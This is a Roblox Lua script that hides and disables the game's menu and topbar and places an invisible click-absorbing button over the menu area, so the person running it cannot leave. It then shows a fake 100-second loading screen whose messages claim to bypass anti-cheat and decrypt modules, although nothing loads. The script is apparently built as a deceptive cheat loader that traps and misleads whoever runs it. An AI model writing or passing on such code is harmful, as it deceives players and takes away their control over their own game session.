pcall(function()
	if game.CoreGui:FindFirstChild("AntiLeaveBlocker") then
		game.CoreGui.AntiLeaveBlocker:Destroy()
	end
end)


local BLOCK_SIZE_X = 56
local BLOCK_SIZE_Y = 56
local BLOCK_POS_X  = 6
local BLOCK_POS_Y  = 6
local DISPLAY_ORDER = 10000


local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")


local function tryHideRobloxMenu()
	pcall(function()
		local names = {"RobloxGui", "RobloxMenu", "Menu", "MenuGui", "Topbar", "TopBar"}
		for _, n in ipairs(names) do
			local g = CoreGui:FindFirstChild(n)
			if g then
				pcall(function()
					if g:IsA("ScreenGui") then
						g.Enabled = false
						for _, c in ipairs(g:GetChildren()) do
							pcall(function() c.Visible = false end)
							pcall(function() c.Enabled = false end)
						end
					else
						for _, c in ipairs(g:GetDescendants()) do
							pcall(function()
								if c:IsA("GuiObject") then
									c.Position = UDim2.new(-10,0,-10,0)
								end
							end)
						end
					end
				end)
			end
		end
	end)
end


local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AntiLeaveBlocker"
screenGui.Parent = CoreGui
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = DISPLAY_ORDER
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local container = Instance.new("Frame")
container.Size = UDim2.new(0, BLOCK_SIZE_X, 0, BLOCK_SIZE_Y)
container.Position = UDim2.new(0, BLOCK_POS_X, 0, BLOCK_POS_Y)
container.BackgroundTransparency = 1
container.BorderSizePixel = 0
container.Parent = screenGui

local blocker = Instance.new("TextButton")
blocker.Size = UDim2.new(1, 0, 1, 0)
blocker.BackgroundTransparency = 1
blocker.AutoButtonColor = false
blocker.Text = ""
blocker.Parent = container
blocker.Active = true
blocker.Selectable = false

blocker.MouseButton1Down:Connect(function() end)
blocker.MouseButton1Up:Connect(function() end)
blocker.MouseButton2Down:Connect(function() end)
blocker.MouseButton2Up:Connect(function() end)


RunService.RenderStepped:Connect(function()
	container.Position = UDim2.new(0, BLOCK_POS_X, 0, BLOCK_POS_Y)
end)


spawn(function()
	while screenGui.Parent and screenGui.Parent == CoreGui do
		tryHideRobloxMenu()
		wait(2)
	end
end)

--// Full-Screen Animated Loading Screen (Looping Messages)
--// Place inside StarterPlayerScripts

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer

-- Create ScreenGui overlay
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "FullLoadingOverlay"
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
screenGui.DisplayOrder = 999999
screenGui.Parent = player:WaitForChild("PlayerGui")

-- Fullscreen background
local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
bg.BackgroundTransparency = 0
bg.Parent = screenGui

-- Center “Loading...” text
local text = Instance.new("TextLabel")
text.AnchorPoint = Vector2.new(0.5, 0.5)
text.Position = UDim2.new(0.5, 0, 0.45, 0)
text.Size = UDim2.new(0, 600, 0, 80)
text.Text = "Loading..."
text.TextColor3 = Color3.fromRGB(255, 255, 255)
text.Font = Enum.Font.GothamBold
text.TextScaled = true
text.BackgroundTransparency = 1
text.Parent = bg

-- Subtext
local subText = Instance.new("TextLabel")
subText.AnchorPoint = Vector2.new(0.5, 0)
subText.Position = UDim2.new(0.5, 0, 0.55, 0)
subText.Size = UDim2.new(0, 400, 0, 40)
subText.Text = "Please wait while assets load..."
subText.TextColor3 = Color3.fromRGB(200, 200, 200)
subText.Font = Enum.Font.Gotham
subText.TextScaled = true
subText.BackgroundTransparency = 1
subText.Parent = bg

-- Progress bar background
local barFrame = Instance.new("Frame")
barFrame.AnchorPoint = Vector2.new(0.5, 0)
barFrame.Position = UDim2.new(0.5, 0, 0.7, 0)
barFrame.Size = UDim2.new(0, 400, 0, 10)
barFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
barFrame.Parent = bg
Instance.new("UICorner", barFrame).CornerRadius = UDim.new(0, 6)

-- Progress bar fill
local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
barFill.Parent = barFrame
Instance.new("UICorner", barFill).CornerRadius = UDim.new(0, 6)

-- Blur effect
local blur = Instance.new("BlurEffect")
blur.Size = 0
blur.Parent = game:GetService("Lighting")
TweenService:Create(blur, TweenInfo.new(1.5, Enum.EasingStyle.Quad), {Size = 20}):Play()

-- Messages to loop through
local messages = {
	"Loading the script...",
	"Bypassing anti-cheat...",
	"Looking for old servers...",
	"Optimizing memory usage...",
	"Decrypting modules...",
	"Finalizing setup..."
}

-- Helper function for smooth text transitions
local function showMessage(message, holdTime)
	text.TextTransparency = 1
	text.Text = message
	local fadeIn = TweenService:Create(text, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {TextTransparency = 0})
	local fadeOut = TweenService:Create(text, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {TextTransparency = 1})

	fadeIn:Play()
	fadeIn.Completed:Wait()
	task.wait(holdTime)
	fadeOut:Play()
	fadeOut.Completed:Wait()
end

-- Run looping messages in background
local loopActive = true
task.spawn(function()
	while loopActive and screenGui.Parent do
		for _, msg in ipairs(messages) do
			showMessage(msg, 2.2)
			if not loopActive then break end
		end
	end
end)

-- Progress bar timing (controls total loading time)
local totalTime = 100 -- seconds; adjust this for total duration
local tween = TweenService:Create(barFill, TweenInfo.new(totalTime, Enum.EasingStyle.Quad), {Size = UDim2.new(1, 0, 1, 0)})
tween:Play()
tween.Completed:Wait()

-- Stop looping when done
loopActive = false

-- Fade out everything
task.wait(0.5)
local fadeTime = 1.5
TweenService:Create(bg, TweenInfo.new(fadeTime), {BackgroundTransparency = 1}):Play()
TweenService:Create(text, TweenInfo.new(fadeTime), {TextTransparency = 1}):Play()
TweenService:Create(subText, TweenInfo.new(fadeTime), {TextTransparency = 1}):Play()
TweenService:Create(barFrame, TweenInfo.new(fadeTime), {BackgroundTransparency = 1}):Play()
TweenService:Create(barFill, TweenInfo.new(fadeTime), {BackgroundTransparency = 1}):Play()
TweenService:Create(blur, TweenInfo.new(fadeTime), {Size = 0}):Play()

task.wait(fadeTime + 0.5)

-- Cleanup
blur:Destroy()
screenGui:Destroy()
